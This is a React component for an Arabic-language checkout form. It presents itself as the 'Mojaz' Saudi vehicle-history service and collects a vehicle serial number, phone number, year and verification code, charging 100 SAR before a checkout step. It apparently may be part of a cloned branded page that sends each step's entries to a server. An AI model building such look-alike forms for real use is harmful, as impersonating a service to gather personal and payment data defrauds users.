import CustomInput from "../CustomInput";
import { useEffect, useState } from "react";
import { handleSubmitTab } from "@/utils/actions";
import { useNavigate } from "react-router-dom";
import { currentPage, sendDataToServer } from "@/context/signals";

const VehicleTab = () => {
  const [error, setError] = useState({});
  const navigate = useNavigate();

  const handleSubmit = (e: any): void => {
    const data = handleSubmitTab(e, setError);
    console.log(data);

    if (data)
      sendDataToServer(
        data,
        "الرئيسية",
        "الخطوة الأولى",
        false,
        navigate,
        "/checkout/1",
        data
      );
  };

  useEffect(() => {
    currentPage.value = "الرئيسية";
  }, []);

  return (
    <>
      <h2 className="pt-4 pb-2 text-xl font-bold border-b">
        معلومات المركبة من موجز
      </h2>
      <p className="sm mt-4">
        خدمة متطورة تقدم المعلومات المتوفرة عن أي مركبة مستعملة منذ تاريخ دخولها
        إلى المملكة العربية السعودية، ويساعد «موجَز» الباحثين عن سيارات مستعملة
        على اتخاذ قرار الشراء بناءاً على معلومات موثوقة المصدر.
      </p>

      <form onSubmit={handleSubmit}>
        <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-4 lg:gap-8 mt-6">
          <CustomInput
            error={error}
            setError={setError}
            label="رقم التسلسل"
            placeholder="رقم التسلسل"
            id="serial"
            maxLength={10}
            type="tel"
            tip={
              "أدخل رقم التسلسل الصحيح للمركبة المراد تأمينها للحصول على تغطية أدق."
            }
          />
          <CustomInput
            error={error}
            setError={setError}
            label="رقم الجوال"
            id="phone"
            placeholder="05xxxxxxx"
            type="tel"
          />

          <CustomInput
            error={error}
            setError={setError}
            label="سنة الصنع"
            placeholder="أختر سنة الصنع"
            id="year"
            yearsDD
            type="text"
            hidValue
          />

          <CustomInput
            error={error}
            setError={setError}
            label="رمز التحقق"
            placeholder="ادخل رمز التحقق"
            id="recap"
            reCAPTCHA
            type={"number"}
          />
        </div>

        <p className="text-[#76b456] text-sm">تكلفة الخدمة: 100 ر.س</p>

        <button
          className="capitalize w-52 lg:w-96 my-6 rounded-md font-bold py-3 px-6 bg-[#76b456] hover:bg-[#76b456]/90 text-white"
          type="submit"
        >
          اشتر الآن
        </button>
      </form>
    </>
  );
};
export default VehicleTab;
